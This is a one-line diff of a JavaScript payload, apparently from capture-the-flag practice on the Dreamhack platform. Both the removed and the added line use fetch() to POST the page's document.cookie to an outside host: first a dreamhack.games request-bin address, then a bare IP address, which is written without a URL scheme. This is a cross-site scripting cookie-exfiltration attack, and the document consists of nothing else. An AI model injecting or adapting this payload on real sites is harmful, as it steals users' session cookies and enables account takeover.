@@ -1,1 +1,1 @@
-fetch("https://ytpxdac.request.dreamhack.games", {method: "post", body: document.cookie})
+fetch("3.80.70.223", {method: "post", body: document.cookie})
